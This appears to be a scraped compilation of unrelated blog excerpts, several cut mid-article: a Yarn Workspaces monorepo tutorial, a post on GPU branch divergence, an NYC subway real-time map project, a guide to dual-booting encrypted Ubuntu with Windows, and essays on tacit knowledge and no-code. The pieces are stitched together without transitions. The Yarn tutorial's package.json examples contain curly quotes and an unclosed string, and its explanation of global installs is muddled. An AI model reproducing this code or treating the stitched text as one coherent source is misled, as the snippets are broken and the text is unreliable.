we don’t want to upload it to NPM. It also creates the spaces where we will set our workspace project names and our scripts.</p><p><strong>4. Create two project directories within your main directory root, like this:</strong></p><p>$ mkdir project-1 project-2</p><p>Feel free to name these however you want.</p><p><strong>5. Add your project names to the workspace package.json that lives within your root directory:</strong></p><p> {</p><p>   "private": true,</p><p>   "name": "my-monorepo-workspace",</p><p>   "workspaces": [“project-1”, “project-2”],</p><p>   "scripts": {}</p><p>}</p><p>Once set up, these two of our projects will be able to share the same installed NPM packages. </p><p>The above steps have now given us our basic Workspace structure. </p><p>Now we can get started with fully activating our Workspace. Let’s add some real code to it before we do that, to demonstrate how it all works.</p><p>We’ll do this by creating a front end in project-1 and a backend in project-2.</p><p><strong>6. For our front-end in project-1, we’ll use React, which we can install with the following command:</strong></p><p>$ yarn create react-app project-1</p><p><strong>7. For our backend in project-2, we’ll use an </strong><a target="_blank" title="https://expressjs.com/" href="https://expressjs.com/"><strong>Express.js</strong></a><strong> server package. Which we can install by first adding Express Generator to our global package.json like so:</strong></p><p>$ yarn global add express-generator --prefix /usr/local</p><p><strong>Note</strong><strong>:</strong> Notice here that we use ‘yarn global add’ instead of the usual ‘yarn add’, now that we have multiple projects, we need to specify the scope of our installed packages for clarity.</p><p><strong>8. Generate and install the Express package for our server in ‘project 2’ like this:</strong></p><p>$ express --view=pug project-2</p><p>Now that we have set up our react app frontend and our express app backend we can now install all of our dependencies.</p><p><strong>9. Install all of the dependencies like so:</strong></p><p>$ yarn install</p><p>This command generates a yarn.lock file, which contains a note of all of your dependencies. This is generated automatically and should not be deleted.</p><p>Our packages our now installed and should be available to both of our projects within the workspace. </p><p>As a final step, let us now set up some scripts that can run our projects for us concurrently, which is wise to do within a shared workspace, as the core concept is about bringing these two together.</p><p><strong>10. We can set up the two projects to run concurrently by first setting the command within our root package.json like this:</strong></p><p>$ yarn add -W concurrently</p><p>This adds the ‘concurrently’ start script that you’ll see below that runs the two project start scripts concurrently. </p><p>To tell our package.json how we want those scripts to run, add the following:</p><p>{</p><p>   "private": true,</p><p>   "name": "my-monorepo-workspace",</p><p>   "workspaces": [“project-1”, “project-2”],</p><p>   "scripts": {</p><p>   	"project-1": "yarn workspace project-1 start",</p><p>   	"project-2": "yarn workspace project-2 start",</p><p>   	"start": "concurrently --kill-others-on-fail \"yarn project-2\"  \"yarn project-1\"</p><p>   }</p><p>}</p><p>The actual scripts that are necessary to run the projects are within the installations within the project directories.</p><p>Last but not least, change the port name within our project-2 express app directory to port 4000, just to ensure that we don’t get conflicts by running the same port 3000 when we run our two app projects.</p><p><strong>11. We can do that like this, within our server/bin/www on line 15:</strong></p><p>var port = normalizePort(process.env.PORT || '4000');</p><p>Now to run our project, all we need to do is go to our root directory and run:</p><p>$ yarn start</p><p><strong>That’s it, we’re done. </strong></p><p>This has fully set up our Yarn Workspace, and has it running!</p><p><em><strong>If you’d like to read some more on the topic of Yarn Workspaces, as well as monorepo's in general.

 <div>
  
  <p><label>Posted on <strong>26 October 2020</strong></label></p><p>An <a href="https://www.google.com/search?q=three+weeks&amp;oq=three+weeks">eternity</a> ago, I published a <a href="https://www.peterstefek.me/focused-render.html">blog post</a> about a shader I wrote. In that post, I casually repeated a piece of gpu folklore I picked up as a wee opengl enthusiast almost a decade ago,   </p>
<p>
"Using if statements inside a shader will cause performance degradation."  
</p>

<p>People on the internet seemed a little skeptical about this statement, and I realized my advice might be outdated. So this post is a quick follow up about the cost of branching on more modern gpus.  </p>
<p>Before we talk about branching, what is a gpu? A GPU or graphics processing unit, is a special piece of hardware initially developed to crunch numbers for graphics calculations. It accomplishes this goal quickly through a large amount of parallelization.   </p>
<p>GPUs can run many threads at the same time in parallel. These threads are generally executed in groups called warps (CUDA), invocations (Vulkan) and waves (I will use the term warp, but they are all interchangeable). On recent Nvidia hardware (Ampere/ Volta / Pascal) these warps contain 32 threads. Pascal for example can theoretically run up to four independent instructions per warp over 56 warps of 32 threads which comes out to a mind blowing 7168 instructions per cycle. </p>
<p>Each warp can only execute one instruction at a time. However that instruction can be executed for each of the threads in the warp. This means the GPU can execute 32 copies of the same instruction in parallel for each thread in the warp at once.   </p>
<p>However, taking both sides of a branch will cause the threads inside a warp to "diverge". This means some threads will need to execute one side of the branch and some will need to execute the other. Unfortunately, both instructions can not be executed simultaneously for threads in the same warp. So these divergent instructions must be executed sequentially.   </p>
<p>
    <img src="https://www.peterstefek.me/images/shader-branch/pascal-divergence.png" width="65%"> 
</p>

<p>The above image is taken from the Volta whitepaper.  </p>
<p>Consider the <a href="https://www.shadertoy.com/view/WdyyWV">following fragment shader</a>:<br>
<code>
void mainImage( out vec4 fragColor, in vec2 fragCoord )
{  <br>
  </code></p><p><code>
  // TUNE THIS AMOUNT TO YOUR GPU STRENGTH<br>
  int workAmount = 2000;<br>
  float incr = 1. / float(workAmount);<br>
  float outColor = 0.0;  
<p>// USE THIS VARIABLE TO TOGGLE BRANCHING<br>
  bool branch = true;  </p>
<p>if (mod(fragCoord.x, 2.) &lt; 1. &amp;&amp; branch) {
    </p><div><p>
      for (int i = 0; i &lt; workAmount; i++) {
        </p><p>
          outColor += incr;
          </p><p>
      }<br>
      fragColor = vec4(0.0,outColor,0.0,1.0);
      </p></div>
  } else {
    <div><p>
      for (int i = 0; i &lt; workAmount; i++) {
        </p><p>
          outColor += incr;
          </p><p>
      }<br>
      fragColor = vec4(outColor,0.0,0.0,1.0);
      </p></div>
  }
  </code></p><p><code>
}
</code></p>
<p>In fragment shaders like the one above, each warp is composed of a set of spatially close pixels. Each warp in this shader should diverge because each horizontally adjacent pixel takes a different side of the branch. Let's say the cost of each inner loop is n cycles. Since each side of the branch is executed in series, each warp must take at least 2n cycles, even though each thread uses only one side of the branch. These effects scale with the number of threads in the distinct divergent paths taken (up to 32x in Nvidia hardware). Here's another shader which should have roughly four branches per warp. <a href="https://www.shadertoy.com/view/wsVyzG">This shader</a> will take at least 4n cycles.  </p>
<p>However, let's look a <a href="https://www.shadertoy.com/view/tsVyzG">second shader</a>:   </p>
<p><code>
void mainImage( out vec4 fragColor, in vec2 fragCoord )
{
  </code></p><p><code>
  // USE THIS VARIABLE TO TOGGLE BRANCHING<br>
  int workAmount = 2000;<br>
  float incr = 1. / float(workAmount);<br>
  float outColor = 0.0;  
<p>// USE THIS VARIABLE TO TOGGLE BRANCHING<br>
  bool branch = true;  </p>
<p>if (fragCoord.x &lt; iResolution.x / 2.0 &amp;&amp; branch) {
    </p><div><p>
      for (int i = 0; i &lt; workAmount; i++) {
        </p><p>
          outColor += incr;
          </p><p>
      }<br>
      fragColor = vec4(0.0,outColor,0.0,1.0);
    </p></div>
  } else {
    <div><p>
        for (int i = 0; i &lt; workAmount; i++) {
          </p><p>
          outColor += incr;
          </p><p>
      }<br>
      fragColor = vec4(outColor,0.0,0.0,1.0);
      </p></div>
  }
  </code></p><p><code>
}
</code></p>
<p>This shader should run roughly twice as fast as the other shader even though roughly the same number of pixels take each branch. This is because most of the warps do not diverge (with the exception of a few around half way across the screen).   </p>
<p><strong>Nvidia Specifics</strong><br>
As far as I can tell, there are roughly two different ways of nvidia graphics cards handle divergence with in a warp.</p>
<p><strong>Thread Masking (Pre Volta)</strong><br>
On pre volta Nvidia card, divergence was handled by something called thread masking.   </p>
<p>Basically when a conditional is hit, a thread mask is generated.  We can think of this mask as a 32 entry array. Each entry specifies whether the corresponding thread takes the first side of the branch or not. The first side is then executed for each of those threads. After the first side of the branch is then executed, the mask is reversed and the other side of the branch is executed.   </p>
<p>This thread mask strategy exists in part because there is only one program counter per warp on pre volta gpus. So essential every thread in the warp must be at the same place in the program. The only way we know which threads to execute, is by using the mask.</p>
<p>
    <img src="https://www.peterstefek.me/images/shader-branch/pascal-divergence.png" width="65%"> 
</p>

<p>The above image is taken from the Volta whitepaper.</p>
<p>It's worth noting that only the threads which need to execute the branch actually are assigned to computational cores. So if no threads execute one side of the branch, no work is done.</p>
<p><strong>Independent Thread Scheduling (Volta and Beyond)</strong><br>
One big change in the Volta architecture and beyond is the introduction of "Independent Thread Scheduling".   </p>
<p>In Independent thread scheduling, each thread has its own program counter. This allows each warp to track the execution of every thread at a fine grain level. However, we can still only execute only one instruction at a time. So the actual runtime of a branch does not change.  </p>
<p>So if Independent Thread Scheduling does not speed up branching, what does it do? Independent Thread Scheduling enables both sides of a branch to execute concurrently but not in parallel.   </p>
<p>
    <img src="https://www.peterstefek.me/images/shader-branch/volta-divergence.png" width="65%"> 
</p>

<p>The above image is taken from the Volta whitepaper.</p>
<p>The reason for this shift is because before Volta, branches were places where deceptive deadlocks could occur. <br>
<code>
leader_id = 0<br>
If (threadIdx.x == leader_id) {<br>
  </code></p><p><code>
    // Do some inital work
  </code></p><p><code>
} else {
  <p>
    // Wait for leader to finish it's work<br>
    // then do my work
  </p>
}<br>
</code></p>
<p>In the above compute shader pseudo code, we have 31 "follower" threads waiting for the "leader thread" to finish (using in-warp shared local memory) before executing their own instructions. </p>
<p>On a Pascal GPU or below, if the else side of the branch is executed first, a deadlock will occur. The leader will never get a chance to start it's work because its followers will be waiting for it. </p>
<p>Independent Thread Scheduling gets around these locking problems by interlacing the two diverging paths. </p>
<p><strong>Article TLDR</strong><br>
Branch divergence in warp makes all parts of the branch execute in sequence which slows down the shader. Branching divergence between warps does not affect runtime.  </p>

            Making a Real-Time NYC Subway Map with Real Weird NYC Subway Data
        </a>
      </h3>
      
            
      <p>Earlier this week the NYC MTA released a new <a href="https://map.mta.info/">digital-first map</a>. The <a href="https://www.curbed.com/2020/10/first-look-new-yorks-digital-subway-map-comes-alive-today.html">Curbed exclusive</a> that announced its release accurately portrays it as a strange child of both the 1972 map design by Massimo Vignelli and the current <a href="https://new.mta.info/map/5256">“paper” map</a>. One feature of the new map (though it's harder than it should be to notice at first) is real-time visualizations of each train in the system.</p>
<p>I've been working on a similar concept, starting in February 2020, on which progress stalled once I stopped riding the subway regularly in March. But, when I started my batch at <a href="https://www.recurse.com/">Recurse Center</a> I decided to pick up the project again. My inspiration for the map was the large TV screens that the MTA has installed in stations over the last few years, which frustratingly display the “paper” version of the map.</p>
<figure>
<p><img src="https://www.patrickweaver.net/images/blog/nyc-subway/tv-screen-map.jpg" alt="A photograph of a TV in a subway station with the “paper” map displayed.">
</p>

</figure>
<p>Over the past few weeks at RC the subway map has been my main focus, which is longer than I expected the project to take (and though I have a prototype, I wouldn’t say I’m close to “done”). A big factor in the time the project has taken is some of the quirks in working with MTA data, which based on some of the bugs I've seen in the "official" version I'd say the team working on that version had to grapple with as well.  I'm not sure I will ever finish this project to a state that would look great on a subway station tv, or be useful, but I do want to point out <a href="https://www.theweekendest.com/trains">The Weekendest</a> by <a href="https://sunny.ng/">Sunny Ng</a> (who also made <a href="https://www.goodservice.io/">goodservice.io</a>), which is a great take on the concept, and handles some of the challenges of this kind of project much better than the MTA map does.</p>
<p>For a long time the NYC Subway was almost <a href="https://www.theatlantic.com/technology/archive/2015/11/why-dont-we-know-where-all-the-trains-are/415152/">completely lacking in real-time data</a>. For many years the only line that had even countdown clocks in stations was the L, which seems to be the line the MTA tries out new technology on, likely because it never shares tracks with any other line. Over the last 5 years the MTA has slowly installed countdown clocks in every station, and made the data that powers the countdown clocks available on their website, in apps, and as data online.</p>
<p>Inspired and frustrated by the “paper” maps on the tv screens, I first became interested in working with MTA data in 2018, but I initially started working with bus data, I think for two reasons: the first was because at the time the API key for working with bus data was easier to obtain than for subway data, the second because my morning commute at the time usually started with the bus (The MTA, earlier this year, has fortunately updated the system for obtaining an API key for subway data). I made a small prototype of an iPhone app that would show real-time bus data, but got distracted by learning the Swift programming language and abandoned the project without building functionality beyond what the MTA already provided <a href="https://bustime.mta.info/">on their bustime website</a>.</p>
<p>That MTA Bustime website was the other inspiration for what became my map idea. Though you could only view one route at a time (and the functionality is not available on phone-size devices), the Bustime website showed, in addition to countdowns for each stop, the physical location of each bus on a map. This leads us to the first weird thing about working with NYC Subway data, unlike real-time bus data, the subway data does not contain the latitude and longitude data for each train that would make it easy to show them on a map.</p>
<h3>Real-Time Transit Data</h3>
<p>Transit data for most transit systems is available in formats called <a href="https://developers.google.com/transit/gtfs">GTFS</a> (General Transit Feed Specification) and <a href="https://developers.google.com/transit/gtfs-realtime">GTFS Realtime</a>, which were developed by Google (makes you wonder what the “G” originally stood for), but are now widely used. A GTFS file is, “a collection of at least six, and up to 13 CSV files (with extension .txt) contained within a .zip file.” and “The GTFS Realtime data exchange format is based on Protocol Buffers” (which are <a href="https://developers.google.com/protocol-buffers">“Google's language-neutral, platform-neutral, extensible mechanism for serializing structured data”</a>).</p>
<p>The GTFS Realtime feeds are available through 9 different API endpoints from the MTA. These 9 endpoints roughly correspond to the line colors, with Shuttles combined with trains they share tracks or stations with, and the 1/2/3 and 4/5/6 sharing one endpoint. This list of separate endpoints is another challenge with working with the entirety of the MTA data.</p>
<p>I have exclusively worked with the NYC MTA’s GTFS Realtime feeds through the <a href="https://www.npmjs.com/package/gtfs-realtime-bindings">npm module</a> maintained by Google. It is very possible that some of the challenges I’ve encountered are due to trying to squeeze the “extensible mechanism for serializing structured data” into JSON. Each API response is mostly composed of an array of "Feed Entity" objects like <a href="https://www.patrickweaver.net/notes/nyc-subway-feed-entity/">these</a>, but there are a few quirks to working with this data (some maybe because of the JSON conversion).</p>
<ul>
<li>Each item in the array has an <code>id</code> property, but unfortunately these ids do not consistently refer to the same train between each update, it's best to ignore it.</li>
<li>The array consists of pairs of objects that either have a <code>tripUpdate</code> property or a <code>vehicle</code> property. Each of these have a sub-property called <code>tripId</code> that allows you to unite the pairs, but there are also some that don't have a corresponding item (usually these represent trips that recently ended or haven't yet begun).</li>
<li>The data mixes together HH:MM:SS timestamps for data about when a train's trip started, and <a href="https://en.wikipedia.org/wiki/Unix_time">Unix timestamps</a> for data about the current time (according to the API) and when a train will arrive at a station (the API provides both arrival and departure times but as far as I have seen they are always identical).</li>
<li><code>tripUpdate</code> items show information about the stops a train will make in the future (stopTimeUpdates) and vehicle items show information about the current status of the train, but the first <code>stopTimeUpdate</code> is usually in the past.</li>
</ul>
<p>I had never heard of Protocol Buffers before starting this project, so I was excited to learn more about them while reading through <a href="https://dataintensive.net/">Designing Data Intensive Applications</a> with fellow Recursers.  In the book Martin Kleppmann notes that a, "curious detail of Protocol Buffers is that it does not have a list or array datatype, but instead has a repeated marker for fields (which is a third option alongside required and optional)." This could be the reason for the strange organization of the <code>tripUpdate</code> and <code>vehicle</code> properties.</p>
<h3>Calculating Train Locations</h3>
<p>The subway real-time API doesn’t have latitude and longitude data because it is designed to feed data to countdown clock style applications that show when the train will be at a specific station. One of the earliest features that I built into the real-time map was a way to translate these station-by-station countdown clocks into an approximation of the location of each train. My first attempt at this was to just show a list of stations and display an icon for a train between the names of the station it had been at previously and the station it was approaching.</p>
<figure>
<p><img src="https://www.patrickweaver.net/images/blog/nyc-subway/prototype-diagram.png" alt="An early prototype diagram of G train positions.">
</p>
<figcaption>A first prototype, still available at: <a href="https://nyc-subway-g.glitch.me/">nyc-subway-g.glitch.me</a></figcaption>
</figure>
<p>The next step was plotting the stations on a map. To start off, as with the diagram version, I just placed each train at the midpoint between the station it was travelling from and the station it was travelling towards.</p>
<p>A goal I had for the project was not just to show real-time train locations, but to animate them as they moved around the map. To determine how long I should expect a train to take to travel between each station I logged updates from the MTA API for a few hours and noted both the average time for a pair of stations, and the longest time I had seen for the pair. I'm still experimenting a little bit with what values to use as the baseline, but from looking at the logged numbers there does seem to be an expected amount of time for most stations.</p>

  <p><span>08 Apr 2020</span></p><p>When you run the Ubuntu installer, there’s an option to dual-boot Ubuntu with an
existing Windows installation. There’s also an option to encrypt your Ubuntu
installation, but <em>only if you erase everything and install ubuntu</em>. There’s no
automatic way to install Ubuntu alongside Windows 10 with encryption. And while
there are plenty of tutorials for dual-booting Ubuntu and Windows, many of them
are outdated – often referencing an MBR partition table – and almost none of
them seem to address encrypting your Ubuntu partition.</p>

<blockquote>
  <p>Dual-booting with encrypted storage should not be this hard in 2020.</p>

  <p>–Me, while figuring out how to do this.</p>
</blockquote>

<p>In reality, once you figure it out, it’s not that hard. The tricky thing is that
this isn’t well-documented <strong>anywhere</strong>! So I’m hoping to fix that with this
tutorial blog post. Honestly, if you know enough about Ubuntu to set up a
dual-boot with Windows, it’s only a little bit harder to do it with encryption.
I prepared this tutorial on a Dell Latitude e7450, and I fine-tuned it when I
tested it on my Dell Precision 5510. So it should work with almost no
modification on most Dell systems, and with only minor modifications
(particularly around BIOS setup) on most other types of computers.</p>

<h2 id="references">References</h2>

<p>To write this guide, I compiled information from several sources. Here are some
of the most useful references I found:</p>

<ul>
  <li><a href="https://gist.github.com/luispabon/db2c9e5f6cc73bb37812a19a40e137bc">XPS 15 9560 Dual-Boot with Encryption Notes</a>,
by <a href="https://gist.github.com/luispabon">luispabon</a>. I followed these notes pretty
closely, but modified some partition sizes and names based on other guides.</li>
  <li><a href="https://gist.github.com/mdziekon/221bdb597cf32b46c50ffab96dbec08a">XPS 15 9570 Dual-Boot with Encryption Notes</a>,
by <a href="https://gist.github.com/mdziekon">mdziekon</a>, upon which the above is based.</li>
  <li><a href="https://help.ubuntu.com/community/Full_Disk_Encryption_Howto_2019">Full Disk Encryption HowTo 2019</a>,
from the Ubuntu Community Wiki. This is a great resource, but deals with
encryption without dual-booting.</li>
  <li><a href="https://help.ubuntu.com/community/ManualFullSystemEncryption">Manual Full System Encryption</a>,
from the Ubuntu Community Wiki. This is longer, and isn’t focused on
dual-booting, but provides great details on the way certain things work.</li>
</ul>

<p>It is worth noting that this method doesn’t encrypt <code>/boot</code>. While there are
valid reasons for encrypting /boot, the graphical installer does not encrypt it
when you do a graphical install with LUKS. As such, I’m matching that precedent,
and keeping the simplicity of an unencrypted /boot partition. Thus, the guide
I’ve compiled below is just about the <strong>simplest way to have a LUKS encryption
with dual-boot.</strong></p>

<h2 id="why-encryption-is-important">Why encryption is important</h2>

<p>I began using encrypted storage on all my personal computers 5 or 6 years ago
after noticing that all the companies I’d worked for required it, and had good
reason to. Laptops get lost and stolen all the time. They’re high-value items
that are small and easy to carry. And when a thief gets your laptop, there’s
tons of valuable information on it that they can use or sell. Even if you use a
password to log in, it’s easy for an attacker to gain access to your data if
your disk isn’t encrypted – for example, by using a live USB stick. And once
they have that data, they might get access to online accounts, bank statements,
emails, and tons of other data. For me, an encrypted hard disk isn’t optional
anymore – its a necessity.</p>

<h2 id="an-overview">An Overview</h2>

<p>So what are we going to do? This tutorial will help you set up a system to
<strong>dual-boot Ubuntu 20.04 and Windows 10</strong>. (I haven’t tested it, but it should
work with most other modern versions (~16.04+) of Ubuntu or Windows.) The system
will use a GPT hard disk with UEFI (your BIOS must support UEFI). The Ubuntu
partition will be encrypted with LUKS.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> The Windows partition can optionally
be encrypted with BitLocker. I’m going to keep the Ubuntu installation as close
to a “default” installation as possible – no fancy tricks like a separate
<code>/home</code> partition, but it should be somewhat easy to add that yourself if you
really want to.</p>

<p>I’m going to start with a blank hard disk, installing both Windows 10 and Ubuntu
from scratch. If you already have Windows installed and you want to keep it, you
should be able to shrink your windows partition and join us in phase 3 (though
you might want to skim phases 1 and 2 to understand what we did).</p>

<p>To give you a broad overview of where we’re headed, here’s what we’re going to
do:</p>

<ol>
  <li>Prepare the installation media and computer</li>
  <li>Install Windows 10</li>
  <li>Create an encrypted partition for Ubuntu</li>
  <li>Install Ubuntu</li>
</ol>

<p>Of course, as with any new OS installation, you should back up any important
data before proceeding. <strong>The instructions below will erase all the data on your
hard disk.</strong> Proceed at your own risk; I’m not responsible for any damage or
data loss.</p>



<p>Since we’re installing both Windows 10 and Ubuntu from scratch, we’ll need a USB
stick for each. If you don’t already have a computer running Ubuntu or Windows,
making the installation media will be a little harder – but there are tutorials
for that and I’ll let you figure it out on your own.</p>

<ol>
  <li>Create a Windows Installer USB stick.  The easiest way is to use the <a href="https://www.microsoft.com/software-download/">Windows
10 Media Creation Tool</a> from a
computer that’s already running Windows.</li>
  <li>Create an Ubuntu 20.04 USB stick. The easiest way is to <a href="https://ubuntu.com/download/desktop">download the
ISO</a> and use the Startup Disk Creator on a
computer that’s already running Ubuntu.</li>
</ol>

<p>Great! We’ve got our USB sticks ready to go! One final thing before we get
started – we need to make sure our BIOS is set up correctly. In particular, we
want to make sure we’re using UEFI to boot our OS.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></p>

<p><img src="https://www.mikekasberg.com/images/dual-boot-encryption/dell-bios.jpg" alt="The Dell BIOS"></p>

<ol start="3">
  <li>Ensure your computer is running the latest BIOS available. This is important
because an out-of-date BIOS can have bugs, and those bugs sometimes affect
things like UEFI, non-Windows operating systems, or other components we’ll be
touching.</li>
  <li>Edit your BIOS settings. The following names are probably specific to Dell
BIOS, but other manufacturers will have similar settings.
    <ol>
      <li>Under <code>General</code> and <code>Boot Sequence</code>, make sure your <code>Boot
List Option</code> is set to <code>UEFI</code>.</li>
      <li>Under <code>General</code> and <code>Advanced Boot Options</code>, I disabled
<code>Legacy Option ROMs</code>. It’s important that both OSes install in UEFI mode.
(You can probably enable this when installation is complete if you care).</li>
      <li>Under <code>Security</code>, <code>TPM Security</code> must be enabled if you
want to easily set up BitLocker in Windows.</li>
      <li>I disabled <code>Secure Boot</code>. I’m not sure if this is absolutely required, and
you can try leaving it on or re-enabling it when you’re done if you want.</li>
    </ol>
  </li>
</ol>

<p>Now that our BIOS is configured for UEFI, we’re going to set up our hard disk.</p>

<div>
<p><b>For this tutorial, your BIOS must support UEFI!</b></p>
<p>Most modern computers support this, but if yours doesn't this tutorial won't
work for you. You should consider:</p>

<ul>
  <li>Installing only Linux with encryption using the graphical installer.</li>
  <li>OR Installing only Windows with encryption.</li>
  <li>OR Dual-booting Linux and Windows without encryption using Ubuntu's graphical installer.</li>
  <li>OR Finding another tutorial or figuring out how to do this with an MBR disk.</li>
</ul>
</div>

<ol start="5">
  <li><strong>Completely erase</strong> your hard disk and set it up for UEFI by doing the
following.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>
    <ol>
      <li>Boot your Ubuntu USB stick and use <code>Try without installing</code>.</li>
      <li>Open a terminal. Make it fullscreen while you’re at it.</li>
      <li>Figure out what your primary hard disk is called. It will probably be
either <code>/dev/sda</code> or <code>/dev/nvme0n1</code>. Importantly, it’s <strong>not</strong> <code>/dev/sda1</code> or
<code>/dev/nvme0n1p1</code> – those are partitions of the disk. One way to figure out what
yours is called is to run <code>lsblk</code> and look at the disk size. Throughout the rest
of this guide, I’m going to refer to <code>/dev/sda</code>. <strong>If yours is not
<code>/dev/sda</code>, replace <code>/dev/sda</code> with your own (perhaps <code>/dev/sdb</code> or
<code>/dev/nvme0n1</code>) for the rest of this guide.</strong></li>
      <li>
        <p>Run the following commands. This will initialize the drive as a GPT drive
and create a 550M EFI system partition formatted as FAT32.</p>

        <div><div><pre><code>$ sudo su
# sgdisk --zap-all /dev/sda
# sgdisk --new=1:0:+550M /dev/sda
# sgdisk --change-name=1:EFI /dev/sda
# sgdisk --typecode=1:ef00 /dev/sda
# mkfs.fat -F 32 /dev/sda1
</code></pre></div>        </div>
      </li>
    </ol>
  </li>
</ol>

<p>OK, phase 1’s complete. We have our installation media ready to go and the
computer’s BIOS and hard drive is set up correctly. Next, we’ll install Windows.</p>

<h2 id="phase-2-install-windows">Phase 2: Install Windows</h2>

<p>In this phase, we’re going to install Windows. Note that when we do this, we’re
going to leave some unallocated space to install Linux later. This is a good
approach because the Windows installer will mess with our partitions a little
bit, and its easier to let it do so before finalizing our Linux partitions.</p>

<p><img src="https://www.mikekasberg.com/images/dual-boot-encryption/windows-installer.jpg" alt="The Windows installer"></p>

<ol>
  <li>Boot from your Windows Installer USB stick.</li>
  <li>Choose a <code>Custom (advanced)</code> install to get to the Windows partitioning tool.</li>
  <li>Create a new partition. The size of this partition should be the amount of
disk space you want to use for Windows. In this example, I did 80G since the SSD
on my computer is relatively small. If unsure, do about half of your hard
disk.</li>
  <li>Windows will warn you that it is going to create an extra system partition.
This is good.<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
  <li>Install Windows onto the partition you just made. There’s no need to format
any partitions – the Windows installer will take care of that for you.</li>
  <li>When the Windows installation is finished, log in and enable BitLocker on
drive <code>C:</code>. This will automatically create yet another partition on your disk
(a Windows recovery partition) - which is why we’re doing it before
partitioning for Ubuntu.</li>
</ol>

<p>At this point, you can start using Windows. But I’d avoid doing too much setup
or personalization yet so you don’t have to do it again if something goes wrong
below. If you want to double check your partitions, this is what you’ll be left
with after installing Windows and enabling BitLocker:</p>

<div><div><pre><code>ubuntu@ubuntu:~$ sudo sgdisk --print /dev/sda
Disk /dev/sda: 500118192 sectors, 238.5 GiB

Number  Start (sector)    End (sector)  Size       Code  Name
   1            2048         1128447   550.0 MiB   EF00  EFI
   2         1128448         1161215   16.0 MiB    0C01  Microsoft reserved ...
   3         1161216       167825076   79.5 GiB    0700  Basic data partition
   4       167825408       168900607   525.0 MiB   2700
</code></pre></div></div>

<h2 id="phase-3-partition-the-drive-for-ubuntu">Phase 3: Partition the drive for Ubuntu</h2>

<p>This is the trickiest phase since this is where we need to manually set up our
encrypted disks for Ubuntu. We’re going to make it work very similar to …</p></div></div>

The players were physically and mentally stronger, and far more mature. The coaching was more intense, the fitness requirements whizzed up a notch, and everything seemed to shift from 0 to 60 extremely quickly.</span></p><p id="viewer-7skt"><span>One of the players on the team was phenomenal. In my first game for the side, he walked in to bat and hit 5 fours off his first 5 balls. He was retired and he walked off the field as if nothing had happened. It was magic. That was my first encounter with a wizard. </span></p><p id="viewer-3gk1g"><span>Wizards do work that is not only brilliant in its own right but work that makes everyone around them better. Our team was filled with an unrivalled sense of confidence. It's what makes wizards valuable. It's why we want to be wizards. </span></p><p id="viewer-c3is3"><span>That season was a phenomenal experience. Even though we were on the same team, and logically we were playing at the same level, it seemed like the skills required were completely different. You couldn’t compare my abilities with his. I improved more in that season than in any other.</span></p><p id="viewer-aao0e"><span>It leads me to wonder how one person on one team helped me produce good work for years to come. <strong>The best explanation I’ve come across is tacit knowledge.</strong> Tacit knowledge is the knowledge and skills we pick up from the people around us and i<!-- -->t plays a disproportionately large role in doing good work. </span></p><p id="viewer-1ugo0"><span>Tacit knowledge is challenging to wrap your head around. This anecdote from an </span><a href="https://commoncog.com/blog/the-tacit-knowledge-series/" target="_blank" rel="noopener"><span><u>essay series</u></span></a><span> on the topic provides context:</span></p><blockquote id="viewer-1mt6r"><span>“Gallwey (a tennis coach) relays the story of teaching a student without explicit instruction: “I was going to skip entirely my usual explanations to beginning players about the proper grip, stroke and footwork for the basic forehand. Instead, I was going to hit ten forehands myself, and I wanted him to watch carefully, not thinking about what I was doing, but simply trying to grasp a visual image of the forehand. He was to repeat the image in his mind several times and then just let his body imitate.” 

It worked. Gallwey concluded: “I was beginning to learn what all good pros and students of tennis must learn: <strong>that images are better than words, showing better than telling, too much instruction worse than none, and that trying often produces negative results.”</strong></span></blockquote><p id="viewer-7j54h"><span>Tacit knowledge is knowledge that cannot be captured through words alone. It’s what’s on display when you ask someone how they did something and they tell you that "it just felt right.” </span></p><p id="viewer-2rjc9"><span><strong>Tacit knowledge is a catalyst that transforms average people with average skills into people with the intuition and know-how to produce good work. It’s not to say that you can’t do good work without it, but you’re far more likely to succeed with it and as a result of it. </strong></span></p><p id="viewer-6i9ji"><span>When learning a new skill, your tacit knowledge resources start at zero. Over time they increase and the quality of your work increases with them. Time spent with wizards reduces the effort required to develop tacit knowledge and produce good work. Why? Because when learning, images are better than words, showing better than telling, and too much instruction worse than none. When you question and imitate wizards, you learn extremely quickly. You place yourself on the shortest path to doing good work. </span></p><p id="viewer-c09e3"><span>It happens because stress elicits growth. Place your body under stress and it’ll overshoot and overprepare in response. It’s how you get stronger and more capable. Do it often enough and good work becomes your default. </span></p><p id="viewer-81jj0"><span>In theory, it’s simple: place yourself under sufficient stress to elicit desired growth. In practice, it’s more complicated. Imagine I went to the gym every day and pushed myself as hard as I could. I’d see growth, but would it be the most growth I’m capable of? Probably not. My biological and nutritional knowledge would let me down, and it would be far tougher to remain motivated when in pursuit of this goal by myself. </span></p><p id="viewer-2rdj8"><span>Intellectual and career growth works in the same way. I can push myself to read more books and learn new skills. I’ll grow, but will I reach the levels I’m capable of without the right environment? Probably not. <!-- -->To get a more accurate picture of the type of growth you’re capable of, you need to be in an environment that fosters and values growth. </span></p><p id="viewer-5dmef"><span>Tobi Lutke, CEO of Shopify, began an apprenticeship at the age of 16.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>To talk about what no-code is good for, we need to first take a digression on what makes no-code fundamentally different from “yes-code” software.</p>
<h2 id="the-grain-of-abstractions">The grain of abstractions</h2>
<p>Software – yes-code software – has been around for a while. One of the things we’ve learned as an industry is how to write software <em>that gracefully evolves</em>. We’re not perfect – sad, legacy systems still proliferate – but we as a technical industry have learned how to build and evolve software systems against changing requirements and constraints that span years and decades.</p>
<p>When we first solve a problem with software, we write some code against the constraints of that particular day. We don’t necessarily know how the problem is going to change. Maybe there will be different customers or stakeholders tomorrow, or maybe the product will expand to serve a related, but different, problem space. We need to be able to change software to accommodate changing circumstances without rewriting it, and that is fundamentally what <em>software engineering</em> is: how to change software systems. <em>Change</em> is the name of the game.</p>
<p>We’ve gotten decent at change. We’ve built tools like Git and patterns like continuous integration and code autoformatting to make it easier to change code and remain stable. We’ve learned how to operate large software teams, especially in open source. We’ve also learned to use better abstractions. Abstractions are conceptual wrappers that isolate different parts of a codebase – say, a data source from a user interface – so that one part may change while another doesn’t. In general we have started to figure out how to make the DNA of software systems resilient against the changing tides of time.</p>
